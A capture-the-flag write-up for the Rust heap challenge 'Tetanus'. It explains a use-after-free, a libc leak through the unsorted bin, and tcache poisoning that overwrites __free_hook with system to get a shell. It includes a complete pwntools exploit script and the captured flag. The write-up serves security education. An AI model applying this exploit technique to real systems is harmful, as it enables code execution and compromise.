# Tetanus
pwn, 492


Classic heap challenge but written in Rust. The vulnerability is deleting a chunk doesn't remove it's pointer from the vector of pointers the program maintains.

Rust uses glibc allocator, and this one uses Ubuntu 19.10, which uses glibc 2.30, meaning tcache stuff will be a bit harder.

Note that before reading / editing a chunk, we must first append an abitrary element so that Rust doesn't freak out when it tries to unpack the chunk into a VecDeque.

The idea is to first leak libc. We can do this by simply allocating a very big chunk, appending some data to it, and then freeing it. It'll end up in the unsorted bin, and we can then read from it to leak a libc offset pointer.

Then, we want to get our write. To do this, we can first allocate two chunks of tcache size, and append data to the first one. Then, we free the second one, then the first one. The tcache looks like: `<chunk 1> -> <chunk 2>`. The tcache counter is 2. The reason why we want to free two chunks instead of just one is because glibc 2.30 prevents the tcache underflow trick that was used in my solve for Four Function Heap.

Then, we can edit the first tcache chunk we freed (b/c UAF) to point to where we want to write (I chose to write to `__free_hook`). The tcache counter is still 2, as we only just modified the linked list pointer.

Allocating a third and fourth chunk from the tcache results in us being able to write the address of `system` to the fourth chunk, since that chunk is at `__free_hook`. 

Then, just allocate a chunk, append `/bin/sh` to it, and free it. The string `/bin/sh` gets passed to what  `__free_hook` points to, which is now the address of `system`, and we get a shell.


```python
from pwn import *


p = remote("2020.redpwnc.tf", 31069)
#p = process("./tetanus")
e = ELF("./tetanus")
libc = ELF("./libc.so.6")

#context.log_level = "debug"

#gdb.attach(p)


def alloc(size):
	print("alloc")
	p.recvuntil("> ")
	p.sendline("1")
	p.sendlineafter("> ", str(size))

def free(idx):
	print("free")
	p.recvuntil("> ")
	p.sendline("2")
	p.sendlineafter("> ", str(idx))


def edit(idx, el_idx, data=0x69696969):
	print("edit")
	p.recvuntil("> ")
	p.sendline("3")
	p.sendlineafter("> ", str(idx))
	p.sendlineafter("> ", str(el_idx))
	p.sendlineafter("> ", str(data))


def append(idx, *args):
	print("append")
	p.recvuntil("> ")
	p.sendline("5")
	#print(args)
	p.sendlineafter("> ", str(idx))
	p.sendlineafter("> ", str(len(args)))
	for i in args:
		print(i)
		p.recvuntil("> ")
		p.sendline(str(i))



def show(idx, el):
	print("show")
	p.recvuntil("> ")
	p.sendline("6")
	p.sendlineafter("> ", str(idx))
	p.sendlineafter("> ", str(el))


alloc(0x404)	# c0
append(0,0x1234)
free(0)
show(0, 0)

libc_leak = int(p.recvline().split()[-1].strip())
print("libc leak", hex(libc_leak))

libc.address = libc_leak - 0x1eabe0

binsh = 0x68732f6e69622f

print("libc address", hex(libc.address))
print("libc __free_hook", hex(libc.sym["__free_hook"]))
#print("libc __malloc_hook", hex(libc.sym["__malloc_hook"]))
print("libc system", hex(libc.sym["system"]))

#one_gadget = libc.address + 0x10afa9
#print("libc one_gadget", hex(one_gadget))

alloc(0x69)	# c1
alloc(0x69)	# c2
append(1, 0x4141)
free(2)
free(1)
edit(1, 0, libc.sym["__free_hook"])

alloc(0x69)	# c3
alloc(0x69)	# c4, this the chunk w/ pointer to where we want to write


# -- This one spawns a shell for you by calling __free_hook with /bin/sh as the memory being freed --
append(4, libc.sym["system"])

alloc(0x10)
append(5, u64("/bin/sh;"))
free(5)

# -- This one spawns a shell for you by utilizing the fact that rust mallocs and frees input, which in this case is the string "/bin/sh" --
#append(4, libc.sym["system"])
#p.recvuntil("> ")
#p.sendline("/bin/sh")

p.interactive()		#flag{w0w_wh0da_thunk_th4t_unsafe_means_unsafe_ls!}
```